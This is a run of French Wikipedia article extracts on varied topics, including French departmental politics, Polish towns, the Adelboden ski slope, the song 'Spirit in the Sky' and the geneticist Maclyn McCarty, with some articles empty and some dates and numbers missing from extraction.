Le département français du Rhône est un département créé le par la partition du département de Rhône-et-Loire. Plus tardivement le département a acquis des communes provenant de Isère. En 2015, la métropole de Lyon obtient le statut de collectivité. Les 208 actuelles communes et les 59 communes de la métropole de Lyon, dont presque toutes sont regroupées en intercommunalités, sont organisées en 13 cantons permettant d'élire les conseillers départementaux. La représentation dans les instances régionales est quant à elle assurée par 12 conseillers régionaux. Le département est également découpé en 14 circonscriptions législatives, et est représenté au niveau national par quatorze députés et sept sénateurs. 
Représentation politique et administrative.
Préfets et arrondissements.
La préfecture du Rhône est localisée à Lyon. Le département possède en outre une sous-préfecture à Villefranche-sur-Saône.
Conseillers métropolitains.
Présidence : Bruno Bernard
Conseillers régionaux.
Présidence : Laurent Wauquiez (Haute-Loire)

</doc>
<doc id="6807203" url="https://fr.wikipedia.org/wiki?curid=6807203" title="Politique de la Haute-Saône">
Politique de la Haute-Saône



</doc>
<doc id="6807205" url="https://fr.wikipedia.org/wiki?curid=6807205" title="Politique dans la Seine-Maritime">
Politique dans la Seine-Maritime

Le département français de la Seine-Maritime est un département créé le en application de la loi du , à partir de l'ancienne province de Normandie. Les 708 actuelles communes, dont presque toutes sont regroupées en intercommunalités, sont organisées en 35 cantons permettant d'élire les conseillers départementaux. La représentation dans les instances régionales est quant à elle assurée par 36 conseillers régionaux. Le département est également découpé en 10 circonscriptions législatives, et est représenté au niveau national par dix députés et six sénateurs. 
Représentation politique et administrative.
Préfets et arrondissements.
La préfecture de Seine-Maritime est localisée à Rouen. Le département possède en outre deux sous-préfectures à Dieppe et Le Havre. Jusqu'en 1926, deux sous-préfectures supplémentaires étaient situées à Neufchâtel-en-Bray et Yvetot.
Conseillers régionaux.
Présidence : Hervé Morin (Eure)

</doc>
<doc id="6807206" url="https://fr.wikipedia.org/wiki?curid=6807206" title="Politique dans les Deux-Sèvres">
Politique dans les Deux-Sèvres

Le département français des Deux-Sèvres est un département créé le en application de la loi du , à partir des anciennes provinces du Poitou et de Saintonge. Les 256 actuelles communes, dont presque toutes sont regroupées en intercommunalités, sont organisées en 17 cantons permettant d'élire les conseillers départementaux. La représentation dans les instances régionales est quant à elle assurée par 9 conseillers régionaux. Le département est également découpé en 3 circonscriptions législatives, et est représenté au niveau national par trois députés et deux sénateurs. 
Représentation politique et administrative.
Préfets et arrondissements.
La préfecture des Deux-Sèvres est localisée à Niort. Le département possède en outre deux sous-préfectures à Bressuire et Parthenay. Jusqu'en 1926, il existait également une sous-préfecture supplémentaires à Melle. 
Conseillers régionaux.
Présidence : Alain Rousset (Gironde)

</doc>
<doc id="6807207" url="https://fr.wikipedia.org/wiki?curid=6807207" title="Politique de la Somme">
Politique de la Somme



</doc>
<doc id="6807209" url="https://fr.wikipedia.org/wiki?curid=6807209" title="Politique du Var">
Politique du Var



</doc>
<doc id="6807211" url="https://fr.wikipedia.org/wiki?curid=6807211" title="Politique de Vaucluse">
Politique de Vaucluse



</doc>
<doc id="6807213" url="https://fr.wikipedia.org/wiki?curid=6807213" title="Politique de la Vendée">
Politique de la Vendée



</doc>
<doc id="6807215" url="https://fr.wikipedia.org/wiki?curid=6807215" title="Politique de la Haute-Vienne">
Politique de la Haute-Vienne



</doc>
<doc id="6807217" url="https://fr.wikipedia.org/wiki?curid=6807217" title="Politique du Val-de-Marne">
Politique du Val-de-Marne



</doc>
<doc id="6807219" url="https://fr.wikipedia.org/wiki?curid=6807219" title="Politique dans le Val-d'Oise">
Politique dans le Val-d'Oise

La vie politique dans le département du Val-d'Oise est institutionnellement constituée du Conseil départemental du Val-d'Oise et du Conseil Régional d'Île-de-France. La préfecture du Val-d'Oise se situe à Cergy-Pontoise.
Représentation politique et administrative.
Préfets et arrondissements.
La préfecture du Val-d'Oise est localisée à Pontoise (Cergy "de facto"). Le département possède en outre deux sous-préfectures à Argenteuil et Sarcelles.
Conseillers régionaux.
Présidence : Valérie Pécresse (Yvelines)

</doc>
<doc id="6807220" url="https://fr.wikipedia.org/wiki?curid=6807220" title="Politique de la Guadeloupe">
Politique de la Guadeloupe



</doc>
<doc id="6807222" url="https://fr.wikipedia.org/wiki?curid=6807222" title="Tournoi de clôture du championnat d'Argentine de football 2010">
Tournoi de clôture du championnat d'Argentine de football 2010

Le tournoi de clôture de la saison 2010 du Championnat d'Argentine de football est le second tournoi semestriel de la du championnat de première division en Argentine. Les vingt équipes sont regroupées au sein d'une poule unique où elles affrontent une fois chacun de leurs adversaires. Un classement cumulé sur les trois dernières années permet de déterminer les deux équipes reléguées à l'issue du tournoi ainsi que les deux formations engagées en barrage de promotion-relégation, mis en place à partir de cette saison.
C'est le club d'Argentinos Juniors qui remporte le tournoi après avoir terminé en tête du classement final, avec un seul point d'avance sur Estudiantes (La Plata) et quatre sur le Godoy Cruz (Mendoza). C'est le troisième titre de champion d'Argentine de l'histoire du club, le premier depuis 25 ans.
Qualifications continentales.
Le vainqueur du tournoi Clôture obtient son billet pour le premier tour de la Copa Libertadores 2011. En ce qui concerne la Copa Sudamericana 2010, la fédération argentine peut aligner 6 équipes qui sont les six premières du classement cumulé (Ouverture et Clôture).
Compétition.
Le barème utilisé pour établir le classement est le suivant :
Classement cumulé.
Un classement cumulé des tournois Ouverture et Clôture permet de déterminer les équipes qualifiées pour la Copa Sudamericana 2010.
Table de relégation.
Un classement cumulé des trois dernières saisons du championnat permet de déterminer les deux équipes reléguées en "Primera B" et les deux qui doivent disputer un barrage de promotion-relégation. 

</doc>
<doc id="6807225" url="https://fr.wikipedia.org/wiki?curid=6807225" title="Piława Górna">
Piława Górna

Piława Górna est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle constitue une gmina urbaine du powiat de Dzierżoniów.
Histoire.
De 1742 à 1945, Gnadenfrei (Gnadenfrey), hauts lieux des frères moraves, fait partie de l'arrondissement de Reichenbach dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="6807227" url="https://fr.wikipedia.org/wiki?curid=6807227" title="Okada Hankô">
Okada Hankô



</doc>
<doc id="6807231" url="https://fr.wikipedia.org/wiki?curid=6807231" title="Fêt kaf">
Fêt kaf



</doc>
<doc id="6807232" url="https://fr.wikipedia.org/wiki?curid=6807232" title="George Harmon Coxe">
George Harmon Coxe

George Harmon Coxe (Olean, New York, - Old Lyme, Connecticut, ) est un scénariste et un écrivain américain de roman policier.
Biographie.
Après des études supérieures à l'Université Purdue en Indiana, puis à l'Université Cornell à Ithaca, dans l'État de New York, George Harmon Coxe devient reporter pour des journaux californiens et new-yorkais, avant de travailler dans une agence de publicité à Cambridge au Massachusetts de 1927 à 1932. Il publie dès 1922 quelques nouvelles dans des magazines, mais se lance vraiment dans l'écriture de nouvelles policières à partir de 1932.
En 1934, il publie dans "Black Mask" la nouvelle "Return Engagement" où apparaît son héros le plus connu, Jack Casey, surnommé « Flash » ou « Flashgun », un photographe qui, comme tous les professionnels du métier à son époque, prend des clichés grâce à un flash au magnésium. Or, pour lui, une photo est souvent le début d'une enquête, car il se targue d'être un excellent détective amateur. Homme grand et gros, Casey a des yeux noirs, les tempes grisonnantes et des poings énormes, dont il préfère pourtant ne pas se servir. Archétype du "tough guy" sentimental et intelligent, il se plaît à démasquer les coupables pour les remettre entre les mains de la police, dont les agents ont essayé en vain de lui mettre des bâtons dans les roues. Vingt-deux nouvelles et cinq romans racontent les exploits de Casey, incarné au cinéma par Stuart Erwin dans "Women Are Trouble" de en 1936 et par Eric Linden dans "" de en 1938. Le personnage devient ensuite la figure centrale d'une populaire série radiophonique, "Casey, Crime Photographer", de 1943 à 1950, avant de connaître les honneurs d'une série télévisée, "Crime Photographer" (1951-1952), en partie réalisée par le jeune Sidney Lumet, avec Richard Carlyle, remplacé après quelques épisodes par Darren McGavin.
Kent Murdock, l'autre héros de George Harmon Coxe, est également détective amateur et photographe pour les pages criminelles d'un journal à grand tirage. Avec sa brillante femme, Joyce, et parfois secondé de son collègue et ami Jack Fenner, il enquête dans une vingtaine de romans et une poignée de nouvelles. Lew Ayres a interprété Murdock au cinéma dans "Murder with Pictures" (1936) de Charles Barton sur un scénario de Harmon Coxe. Ce dernier travaille en effet à Hollywood, entre 1936 et 1938, puis en 1944, pour le compte des studios Paramount et MGM. Il y signe quelques scénarios, notamment celui du "Retour d'Arsène Lupin" (1938) de George Fitzmaurice, avec Melvyn Douglas.
Très estimé par ses pairs, George Harmon Coxe reçoit en 1964 le Grand Master Award du Mystery Writers of America.

</doc>
<doc id="6807237" url="https://fr.wikipedia.org/wiki?curid=6807237" title="Abdelhay Sghaier">
Abdelhay Sghaier

Abdelhay Sghaier (), né le à Gabès et mort le à Tunis, est un diplomate tunisien.
Biographie.
Diplômé de l'École nationale d'administration et de la faculté de droit de Tunis, il milite activement dans les rangs du Néo-Destour à partir de 1947.
En octobre 1962, il est nommé administrateur du gouvernement et chargé de la rédaction et de la gestion du journal du Néo-Destour, "L'Action tunisienne".
Il entame une carrière diplomatique comme chargé de mission à l'ambassade de Tunisie en France en 1963.
Il effectue ensuite de nombreux stages diplomatiques au sein de la Ligue arabe, de l'Office des Nations unies à Genève, de l'Académie diplomatique de Vienne, du ministère français des Affaires étrangères, du ministère tchécoslovaque des Affaires étrangères et de la Communauté économique européenne (1968-1969).
Il occupe en 1970 le poste de chef du service diplomatique et du service de presse auprès du Premier ministre Hédi Nouira.
À nouveau chargé de mission auprès de l'ambassade de Tunisie en France, en 1971-1972, il revient en Tunisie pour devenir directeur de "L'Action tunisienne" et ce jusqu'en 1980.
En 1981, il mène à bien la mission diplomatique visant à la création de l'ambassade de Tunisie en Mauritanie en tant que chargé d'affaires. Il y devient ambassadeur de Tunisie entre 1984 et 1987.
En 1988, il prend le poste de chargé de mission auprès du Premier ministère, avant de devenir ambassadeur extraordinaire et plénipotentiaire au Yémen, représentant également son pays en Somalie et à Djibouti.
De retour en Tunisie, il est nommé ambassadeur de Tunisie en Algérie, poste qu'il occupe jusqu'en 1995.
Plus tard, il occupe le poste de directeur général des affaires du monde arabe au sein du ministère des Affaires étrangères.
Après sa retraite, Sghaier reste actif dans la société civile, en tant que chargé de cours à l'Institut de financement du développement du Maghreb arabe et à l'Institut diplomatique pour la formation et les études, ainsi qu'en tant que secrétaire général de l'association Réseau méditerranéen pour le développement durable".
Marié en 1963, il est père de quatre enfants. Il parle arabe, français, anglais et allemand.

</doc>
<doc id="6807239" url="https://fr.wikipedia.org/wiki?curid=6807239" title="Hiroshi Okada">
Hiroshi Okada

 est un peintre japonais du , né en 1923 à Osaka et mort en 2008.
Biographie.
Hiroshi Okada naît en 1923 à Osaka. Il est un sculpteur-abstrait-géométrique. Il participe à des expositions collectives dont : Exposition d'art japonais moderne en 1966 à Venise, en 1967 à Kyoto : Tendances de l'Art japonais contemporain, au Musée National d'Art Moderne, en 1968 et 1969 à Tokyo : Exposition d'Art japonais contemporain, à Londres en 1968: Salon de l'Institut d'Art contemporain. Il est mort en 2008.

</doc>
<doc id="6807246" url="https://fr.wikipedia.org/wiki?curid=6807246" title="Marc Demeulenaere">
Marc Demeulenaere



</doc>
<doc id="6807253" url="https://fr.wikipedia.org/wiki?curid=6807253" title="Chocianów">
Chocianów

Chocianów (en allemand "Kotzenau") est une ville de Pologne, située dans l'ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Chocianów, dans le powiat de Polkowice.
Histoire.
De 1742 à 1945, Kotzenau fait partie de l'arrondissement de Lüben dans le district de Liegnitz au sein de la province de Silésie.

</doc>
<doc id="6807258" url="https://fr.wikipedia.org/wiki?curid=6807258" title="Przemków">
Przemków

Przemków est une ville de Pologne, située dans l'ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Przemków, dans le powiat de Polkowice.
Géographie.
La ville se trouve dans la région historique de Basse-Silésie, à environ 25 kilomètres au sud-ouest de Głogów et à 80 kilomètres au nord-ouest de Wrocław.
Histoire.
Appartenant aux possessions du duc silésien Conrad II de Głogów, le domaine passa dans les mains de son fils cadet Przemko en 1273 ou 1274. Ce dernier y fit construire une forteresse et un hameau marchand, nommé "Przemków" en son honneur après sa mort sur le champ de bataille en 1289. La localité fut mentionnée pour la première fois dans un acte de 1305. Les citoyens ont obtenu le droit de Magdebourg en 1484.
Faisant partie des pays de la couronne de Bohême pendant des siècles, la ville était occupée par les troupes du roi Frédéric II en 1740, au cours de la première guerre de Silésie, puis annexée par le royaume de Prusse aux termes du traité de Breslau en 1742. Le manoir était la possession des nobles familles von Roedern et Seherr-Thoß. Jusqu'en 1780, il fut la résidence du comte Henri IX de Reuss-Kostritz. 
Dès 1815, "Primkenau" fait partie de l'arrondissement de Sprottau dans le district de Liegnitz au sein de la Silésie prussienne. En 1853, le domaine est acquis par le duc Christian-Auguste de Schleswig-Holstein-Sonderbourg-Augustenbourg (1798-1869), grand-père de la future impériatrice Augusta-Victoria. Le frère d'Augusta-Victoria, Ernest-Gonthier de Schleswig-Holstein, fit construire le « nouveau château » ("Neues Schloss") sur les plans de l'architecte Ernst von Ihne. Son épouse Dorothée de Saxe-Cobourg-Gotha, la petite-fille du roi Léopold II de Belgique, hérita du château au décès de son mari en 1921. 
En 1945, à la fin de la Seconde Guerre mondiale, la ville fut conquise par l'Armée rouge puis rattachée à la république de Pologne. La population germanophone restante était expulsée et le château sera détruit.

</doc>
<doc id="6807260" url="https://fr.wikipedia.org/wiki?curid=6807260" title="Victor Arago">
Victor Arago

Pierre, Jean, Victor Arago (né à Estagel le et mort à Versailles le ) est un militaire français.
Biographie.
Famille.
Victor Arago est le huitième enfant de François Bonaventure et Marie Arago. Polytechnicien, il effectue de brillantes études avant de partir combattre en Espagne, puis suit diverses affections militaires en France.
Carrière militaire.
En 1832, il est l'auteur d'un fait d'armes mémorable lors du siège de la citadelle d'Anvers : bien qu'en difficulté, il parvient, avec ses hommes, à être le premier dans la citadelle sans perdre un homme. Le duc d'Orléans, à qui il est présenté pour cet exploit, s'exclame .
En 1848, il échoue à devenir député des Pyrénées-Orientales : trois de ses frères le sont déjà, il lui est objecté que cela ferait . Il devient commandant de la garnison de Perpignan, puis de celle de l'île d'Aix. Restant proche de sa famille, il soutient financièrement son frère Étienne lorsque celui-ci éprouve des difficultés pour entretenir son théâtre.
Le quotidien de sa vie militaire est peu connu, les archives le concernant ayant été perdues.
Chef d'escadron d'artillerie en retraite à sa mort et Officier de la Légion d'honneur, mort en sa demeure 60 rue du Plessis à Versailles. Il avait épousé Charlotte Claire Vorget de Voislemont (1803) dont deux fils Victor Joseph Arago (1832), capitaine au 9ème régiment d'infanterie de ligne en 1867, dmt à Paris et Nicolas Emmanuel Arago (1840) entrepreneur des tabacs de Versailles y dmt.

</doc>
<doc id="6807261" url="https://fr.wikipedia.org/wiki?curid=6807261" title="Chuenisbärgli">
Chuenisbärgli

Chuenisbärgli est une piste de ski dans l'Oberland bernois en Suisse. Elle est située en dessus du village d'Adelboden et est connu en raison de la course de Coupe du monde de ski alpin qui y a lieu chaque année.
Course de coupe du monde.
La piste du Chuenisbärgli est connue comme étant la piste de slalom géant la plus difficile de la Coupe du monde messieurs. La partie du départ ainsi que la pente d'arrivée, également connue sous le nom de " sont très raides. La piste accueille également des courses de slalom. Entre 1994 et 2022, Hans Pieren fut directeur de course à Adelboden.
Le départ du slalom géant culmine à mètres d'altitude et celui du slalom à mètres. La longueur de piste est respectivement de et de mètres. L'aire d'arrivée quant à elle se situe pour les deux courses à mètres. Les courses d'Adelboden sont parmi les plus populaires avec près de spectateurs le long de la piste ainsi que dans la zone d'arrivée.
Les premières journées internationales de ski d'Adelboden, en Allemand ", ont eu lieu en 1955, et sont depuis 1967 une épreuve de la Coupe du monde. Les épreuves sont reportées dans d'autres localités en raison du manque de neige en 1988, 1990, 1993 et 1994. En 2005, en raison des conditions de la FIS, un nouveau télésiège à quatre places a remplacé, au même endroit, le Téléski utilisé durant 50 ans. 
Le record de victoires en Coupe du monde sur la Chuenisbärgli, et sur un site en général, slaloms et géants cumulés est la propriété de Marcel Hirscher qui y totalise neuf succès depuis 2012 avec au passage trois doublés, en 2012, 2018 et 2019. 
Organisation.
Le montage et le démontage pour les épreuves de Coupe du monde durent huit semaines. L'armée suisse et la protection civile sont un soutien essentiel à cet événement. Ils mettent à disposition des hommes à hauteur de jours-homme pour l'armée et pour la protection civile. On compte aussi jusqu'à 1600 bénévoles, le budget total se situe autour de 6 M CHF .

</doc>
<doc id="6807270" url="https://fr.wikipedia.org/wiki?curid=6807270" title="Loi du 21 août 2007 en faveur du travail, de l'emploi et du pouvoir d'achat (« TEPA »)">
Loi du 21 août 2007 en faveur du travail, de l'emploi et du pouvoir d'achat (« TEPA »)



</doc>
<doc id="6807279" url="https://fr.wikipedia.org/wiki?curid=6807279" title="Głuszyca">
Głuszyca

Głuszyca est une ville de Pologne, située dans l'ouest du pays, dans la voïvodie de Basse-Silésie. C'est le chef-lieu de la gmina de Głuszyca, dans le powiat de Wałbrzych.
Histoire.
De 1818 à 1945, Wüstegiersdorf fait partie de l'arrondissement de Waldenburg dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="6807281" url="https://fr.wikipedia.org/wiki?curid=6807281" title="Seigneurie de Valbonne">
Seigneurie de Valbonne

La seigneurie de Valbonne était une seigneurie tenue par les seigneurs de La Valbonne, aujourd'hui hameau de Balan et Béligneux, dans la région naturelle de la Côtière et dans le département français de l'Ain. Sa domination sur la région fut effective jusqu'au .
Situation.
La seigneurie de la Valbonne s'étendait entre le bas de la Côtière et le Rhône, depuis Miribel jusqu'à Meximieux.
Histoire.
"Olim" Vallis Bona, Valbonna.
La Valbonne fut à l'origine la possession des seigneurs de Montluel. En 1326, elle passe aux dauphins de Viennois, qui en firent une baronnie, en 1343, au roi Jean, et enfin, en 1354, aux comtes de Savoie. Elle forme un des bailliages des États de Savoie avec pour centre, Montluel.
En 1454, les terres de Valbonne sont ravagées par le dauphin Louis XI sur un coup de colère contre son père Charles VII venu l'empêcher de se marier avec charlotte de Savoie.
Le , elle est érigée en titre de comté par le duc Louis de Savoie.
La seigneurie de Montluel fut d'abord une châtellenie dépendant de cette seigneurie, avant de s'émanciper de celle-ci, probablement à partir de la fin du .

</doc>
<doc id="6807282" url="https://fr.wikipedia.org/wiki?curid=6807282" title="Bourek annabi">
Bourek annabi

Le bourek annabi , est une spécialité algérienne originaire de la ville d'Annaba. Il s'agit d'une entrée salée à base de feuille de brik, farcie de pommes de terre en purée et d'un mélange de viande hachée ou de thon, d'oignons, de fromage et de persil. Le tout est surmonté d'un œuf cru assaisonné et qui cuit une fois la feuille de brik repliée en forme carré et trempée dans l'huile bouillante.
Étymologie.
Le terme "bourek" dérive de "börek", qui est l'appellation ottomane d'une spécialité culinaire, suivi du terme « "annabi" » faisant référence à la ville d'Annaba en Algérie et désignant ainsi l'origine de la spécialité.
Consommation.
Le "bourek annabi" est typique des repas ramadanesques annabis ; il accompagne le "jari" ou "chorba frik" . Cette spécialité est très populaire dans la ville, surtout durant les périodes estivales, vendue dans les restaurants d'Annaba et par des commerçants ambulants.

</doc>
<doc id="6807284" url="https://fr.wikipedia.org/wiki?curid=6807284" title="Spirit in the Sky (chanson de Norman Greenbaum)">
Spirit in the Sky (chanson de Norman Greenbaum)

 est une chanson écrite, composée et interprétée par le chanteur américain Norman Greenbaum sortie en 1969 sous la forme d'un single et extraite de l'album "Spirit in the Sky".
Elle connaît un très grand succès international, se classant en tête des ventes dans plusieurs pays : Allemagne, Australie, Canada, Irlande, Royaume-Uni. Aux États-Unis, elle atteint la du Billboard Hot 100 et reçoit une certification double platine par la RIAA.
Il s'agit du seul tube de la carrière de Norman Greenbaum.
Le morceau a été repris avec succès par le groupe Doctor and the Medics en 1986 et par le chanteur Gareth Gates en 2003. Ces deux versions, comme l'originale, se sont classées des charts britanniques.
Caractéristiques et inspirations de la chanson.
La chanson se caractérise par un effet de distorsion sur la guitare Fender Telecaster jouée par Norman Greenbaum, ainsi que par son mélange de gospel et de rock psychédélique.
L'inspiration pour l'écriture des paroles est venue après que Greenbaum a vu à la télé Porter Wagoner interpréter une chanson gospel. Dans les paroles, où il est question de la vie après la mort, le nom de Jésus est cité plusieurs fois, bien que Greenbaum soit juif. Selon lui, employer le nom de Jésus pour parler de Dieu plutôt qu'un nom utilisé dans la religion juive rendait la chanson plus commercialisable.
Distinction.
Selon le magazine "Rolling Stone", "Spirit in the Sky" interprétée par Norman Greenbaum fait partie des 500 plus grandes chansons de tous les temps.
Utilisation dans les médias.
La chanson est présente dans de nombreux films dont "Wayne's World 2" et "Le Gang des champions" en 1993, "Contact" en 1997, "My Name Is Joe" en 1998. Elle figure dans l'album "Guardians of the Galaxy - Awesome Mix Vol. 1" du film de l'univers cinématographique Marvel "Les Gardiens de la Galaxie", sorti en 2014. Elle est aussi jouée durant le film "Apollo 13" de Ron Howard ayant été emportée par Fred Haise sur le vol Apollo 13. Elle est également jouée dans les films "Ninja Turtles 2" et "Suicide Squad", sortis durant l'été 2016. Elle est présente dans le générique de fin de "" en .
À la télévision, elle est jouée à la fin du "Les jeux sont faits" de la de "Dr House", elle est aussi présente dans la de la série "Supernatural" ainsi que l'épisode 18 de la saison 2 de "Brooklyn Nine-Nine". Elle est aussi jouée dans le documentaire "Jesus Camp" de Rachel Grady et Heidi Ewing (2006).
Version de Doctor and the Medics.
Spirit in the Sky interprété par le groupe britannique Doctor and the Medics sort en single en , extrait de l'album "Laughing at the Pieces".
Cette version rencontre un succès international et se classe des ventes dans plusieurs pays.
Version de Gareth Gates featuring The Kumars.
Spirit in the Sky interprété par le chanteur britannique Gareth Gates avec la participation des acteurs de la série télévisée "The Kumars at No. 42" sort en single en au profit de l'organisation caritative britannique Comic Relief. La chanson figure sur l'album "Go Your Own Way".
C'est un succès dans plusieurs pays européens.
Autres reprises.
Parmi les artistes ayant repris la chanson figurent entre autres Dorothy Morrison, Carl Wayne, Bauhaus, Nina Hagen, Kim Wilde, ou Pura Fé sur l'album Sacred Seed en 2015.

</doc>
<doc id="6807285" url="https://fr.wikipedia.org/wiki?curid=6807285" title="Born Bad Records">
Born Bad Records

Born Bad Records est un label de rock indépendant français. Il a été fondé en 2006 par Jean-Baptiste Guillot surnommé JB Wizz. Le nom du label provient d'un disquaire situé dans le de Paris fondé en 1999. Le label publie des groupes de rock français contemporains d'une part, œuvrant principalement dans le garage ou le post-punk, tels que Frustration ou The Feeling of Love et des rééditions d'albums et de compilations de groupes ou artistes difficilement trouvables d'autre part. Ainsi, par exemple, le label publie en 2012 pour la première fois la bande originale du film "Le mariage collectif" composée par Jean-Pierre Mirouze à la suite de sa redécouverte dans une décharge de la région parisienne. Le label reçoit en 2017 le "Prix du petit label" et le "Prix de l'album audacieux" lors de la cérémonie des Prix des Indés .

</doc>
<doc id="6807289" url="https://fr.wikipedia.org/wiki?curid=6807289" title="Jedlina-Zdrój">
Jedlina-Zdrój

Jedlina-Zdrój est une ville de Pologne, située dans l'ouest du pays, dans la voïvodie de Basse-Silésie. Elle constitue une gmina urbaine du powiat de Wałbrzych. Elle est jumelée avec Saint-Etienne-de-Crossey.
Histoire.
La ville s'est appelée "Bad Charlottenbrunn" à l'époque des Allemands des Sudètes (1150-1945).
De 1818 à 1945, Bad Charlottenbrunn fait partie de l'arrondissement de Waldenburg dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="6807292" url="https://fr.wikipedia.org/wiki?curid=6807292" title="Je Reste">
Je Reste



</doc>
<doc id="6807298" url="https://fr.wikipedia.org/wiki?curid=6807298" title="Arbre de pierre">
Arbre de pierre



</doc>
<doc id="6807301" url="https://fr.wikipedia.org/wiki?curid=6807301" title="Facteur de remplissage">
Facteur de remplissage

Le facteur de remplissage est une propriété relative aux panneaux photovoltaïques.
Il est défini comme le ratio de la puissance électrique maximale par le produit du courant de court circuit et la tension en circuit ouvert.
Le facteur de remplissage s'exprime donc par :
formula_1
et est généralement exprimé en %.
Il peut être utile d'utiliser le facteur de remplissage pour déterminer le rendement de cellules photovoltaïques.

</doc>
<doc id="6807305" url="https://fr.wikipedia.org/wiki?curid=6807305" title="Š̤">
Š̤

Š̤ (minuscule : š̤), appelé S caron tréma souscrit, est un graphème utilisé dans la romanisation du mandéen.
Elle est composée de la lettre S diacritée d’un caron et d’un tréma souscrit.
Représentations informatiques.
Le S caron tréma souscrit peut être représenté par les caractères Unicode suivant :

</doc>
<doc id="6807312" url="https://fr.wikipedia.org/wiki?curid=6807312" title="Maclyn McCarty">
Maclyn McCarty

Maclyn McCarty, né le à South Bend dans l'Indiana, mort le , est un généticien américain. Il passe sa vie à étudier les organismes des maladies infectieuses. Il est plus connu pour avoir participé à la découverte de l'ADN comme constituant chimique des gènes et non pas la protéine. La découverte des secrets moléculaires du gène en question, qui pour les polysaccharides encapsulés de la bactérie pneumococcique, ont permis d'étudier l'hérédité, non plus uniquement par la génétique mais également par la chimie, ce qui induit le début de la chimie moléculaire. McCarty est le plus jeune et celui ayant vécu le plus longtemps de l'équipe de recherche qui a permis cette découverte, connue sous le nom d'Expérience de Avery, MacLeod et McCarty. Maclyn McCarty est mort d'insuffisance cardiaque congestive.
Biographie.
Maclyn McCarty est né en 1911 à South Bend, dans l'Indiana. Il est le second de quatre fils d'un responsable de filiale de Studebaker Corporation, à l'époque où ce n'est qu'une entreprise de transports par chariots attelés. Durant son adolescence, McCarty se fixe l'objectif de devenir physicien, et prépare une stratégie, couronnée de succès, pour préparer son admission à la faculté de médecine de l'université Johns-Hopkins.
Ayant achevé un cycle prégradué, il rejoint l'université Stanford où il commence ses études dans les domaines naissants de la biochimie, travaillant avec James Murray Luck sur le taux de renouvellement de la protéine dans le foie.
En 1937, il débute sa formation clinique en pédiatrie au service Hariet Lane de l'université Johns-Hopkins où il développe un intérêt particulier pour les maladies infectieuses, en particulier, les traitements antibactériens sulfamidés dont l'usage est naissant dans la médecine. Par la suite, il continue ses travaux en rejoignant l'université de New York afin de travailler avec William Tillett. Une place de membre au Conseil national de recherches en sciences médicales et une occasion de travail au laboratoire d'Oswald Avery l'amènent à rejoindre l'université Rockefeller en 1941.
À ce moment, les recherches dans le laboratoire d'Avery sont ciblées sur la transformation pneumococcique, le changement héréditaire d'une souche pneumococcique depuis une forme non virulente rugueuse jusqu'à une forme virulente lisse encapsulée. L'arrivée de McCarty à l'Institut Rockefeller en marque les 13 ans de cette découverte, connue sous le nom d'expérience de Griffith. Avant cela, les années 1920 ont été marquées par une série d'observations disparates sur le Streptococcus pneumoniae qui ont tendu à démontrer un échange de récepteurs parmi diverses bactéries élevées soit dans un environnement liquide ou exposées à différents extraits et liquide surnageant. À de rares exceptions près, les premiers chercheurs dans ce domaine ont été complètement confus à propos de la distinction entre génotype et phénotype. Aucune expérimentation n'a été lancée par d'autres chercheurs, et, de ce fait, le domaine de para-agglutination n'est pas considéré à sa juste valeur.
Malgré cela, en 1928, Frederick Griffith, une personnalité dans la recherche en santé publique en Grande-Bretagne, démontre que la conversion d'une souche à une autre peut arriver " sur des souris. Peu après la publication de ces résultats, ils sont confirmés par plusieurs sources, notamment le laboratoire d'Avery. Les analyses se basent sur le sérovar, il est connu que la différenciation phénotypique de groupes pneumococciques peut être diagnostiquée par leur réaction avec certains sérums sanguins, déjà reconnue pour refléter chimiquement des polysaccharides capsulaires distincts. Griffith n'a ni les ressources ni l'envie de purifier et identifier l'agent responsable dans des extraits pneumococciques induisant les changements de sérovar. Mais le phénomène de transformation est finalement vaguement compris comme étant une altération de ce que nous appellerions aujourd'hui les facteurs génétiques.
Bien qu'interrompues, parfois pour plusieurs années, ces études sont depuis 1928 le sujet central du laboratoire d'Avery. Aux alentours de 1940, elles sont activées par les efforts de Colin MacLeod à purifier l'agent chimique responsable des changements de sérovar, soit la protéine, l'acide nucléique ou un autre type de molécule, et démontre qu'il est nécessaire et suffisant pour causer le phénomène de Griffith. Les études sur la transformation pneumococcique sont rendues extrêmement difficiles par une grande variété de variables, qu'il faut contrôler pour permettre une estimation quantitative de la transformation de l'activité en extraits passant par plusieurs stades de purification. MacLeod, après plusieurs années de recherches, résout plusieurs questions techniques épineuses pour rendre le système d'expérimentation plus fiable par un essai sur l'activité biologique. Au moment où McCarty arrive à l'Université Rockefeller, l'équipe d'Avery vient de découvrir que l'agent réactif n'est pas la protéine. Mais qu'était-ce donc ? Pouvait-ce être un glucide soluble, l'ARN, ou moins probablement, l'ADN ? Les progrès de cette recherche durant les trois années suivantes sont décrits dans le mémoire de McCarty " écrit au début des années 1980.
Pendant que la purification progresse, l'exposition d'extraits de cristalline RNase à des préparations de peptidase aide l'équipe d'Avery à déterminer que l'activité biologique des extraits n'est pas dépendante à l'ARN ou la protéine. La cristalline DNase n'est pas disponible avant 1948, mais l'activité biologique est rapidement réduite par des extraits de tissu riche en DNase. L'arrivée de McCarty à l'Université Rockefeller marque un nouveau progrès, à savoir, le développement d'un essai de réaction de la diphénylamine qui amène à une corrélation positive entre l'ADN avec l'activité biologique. Il devient de plus en plus évident que les matériaux actifs dans des extraits purifiés ont étonnamment un haut potentiel dans des microgrammes d'ADN qui pourrait créer la transformation pneumococcique "".
Maclyn McCarty, Colin MacLeod et Oswald Avery se battent avec les standards de preuves requis afin de prouver qu'ils ont accompli une transformation pneumococcique avec de l'ADN hautement purifié depuis des extraits. Après plusieurs enquêtes personnelles, en 1944, ils publient dans le que le matériel actif est, en effet de l'ADN privé de protéine ou de tout autre polymère connu.
